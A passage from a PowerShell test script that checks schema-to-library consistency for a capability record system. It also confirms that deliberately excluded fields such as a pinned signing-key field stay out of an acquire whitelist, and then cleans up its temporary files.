    Write-Case "CE44 schema node $label matches lib" (($schemaNames -join ',') -eq ($libNames -join ',')) "(schema: $($schemaNames -join ',') / lib: $($libNames -join ','))"
}
$schemaEnums = @(Get-SchemaEnumPaths -Node $schemaDoc)
$unmirroredEnums = @($schemaEnums | Where-Object { -not $schemaEnumMirror.Contains($_) })
Write-Case 'CE44 every schema enum is mirrored by a lib constant' ($unmirroredEnums.Count -eq 0) "(unmirrored: $($unmirroredEnums -join ', '))"
foreach ($path in $schemaEnumMirror.Keys) {
    $node = $schemaDoc
    foreach ($seg in $path.Split('.')) { $node = $node.properties.$seg }
    $schemaValues = @($node.enum | Sort-Object)
    $libValues = @($schemaEnumMirror[$path] | Sort-Object)
    Write-Case "CE44 schema enum $path matches lib" (($schemaValues -join ',') -eq ($libValues -join ',')) "(schema: $($schemaValues -join ',') / lib: $($libValues -join ','))"
}

# CE45 -- some fields are absent from the whitelist ON PURPOSE, and an unexplained absence is what invites
# the next editor to "complete" it. hash_source_pubkey is the live case: whitelisting it before the schema
# and payload work lands would make gpg_or_sigstore batch-eligible again (ruling 6's fail-closed default).
$deliberate = @($script:CapabilityDeliberatelyAbsentAcquireKeys.Keys)
$leaked = @($deliberate | Where-Object { $script:CapabilityAcquireKeys -contains $_ })
Write-Case 'CE45 every deliberately-absent field is still absent from the acquire whitelist' ($leaked.Count -eq 0) "(leaked in: $($leaked -join ', '))"
Write-Case 'CE45 the pinned-key field is registered as deliberately absent' ($script:CapabilityDeliberatelyAbsentAcquireKeys.Contains($script:CapabilityPinnedKeyField)) "(registered: $($deliberate -join ', '))"
Write-Case 'CE45 each registered absence states why' (@($deliberate | Where-Object { [string]::IsNullOrWhiteSpace([string]$script:CapabilityDeliberatelyAbsentAcquireKeys[$_]) }).Count -eq 0)

Assert-Reject 'CE46 unknown expected_output_assert field' 'unknown expected_output_assert field' {
    param($r) $r.verify.expected_output_assert.looks_official = 'x'; Set-RecipeSeal $r | Out-Null
}

$ce42 = Test-CapabilityBatchEligible -Record ([pscustomobject]@{ nothing = 'here' })
Write-Verdict 'BROKEN   a record with no acquire block' $ce42
Write-Case 'CE42 an unreadable record yields a verdict, not a crash' ((-not $ce42.eligible) -and (-not [string]::IsNullOrWhiteSpace($ce42.reason)))

Remove-Item -LiteralPath $root -Recurse -Force -ErrorAction SilentlyContinue
Write-Output ("RESULT: {0} passed, {1} failed" -f $passed, $failed)
if ($failed -gt 0) { exit 1 }
exit 0
